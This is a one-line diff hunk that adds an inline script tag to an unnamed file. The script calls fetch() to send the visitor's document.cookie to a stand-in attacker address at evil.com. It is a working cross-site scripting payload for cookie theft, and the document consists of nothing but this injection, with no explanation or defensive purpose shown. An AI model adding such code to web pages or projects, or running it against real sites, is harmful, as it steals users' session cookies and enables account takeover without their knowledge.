@@ -1,0 +1,1 @@
+<script>fetch('https://evil.com/steal?cookies='+document.cookie);</script>
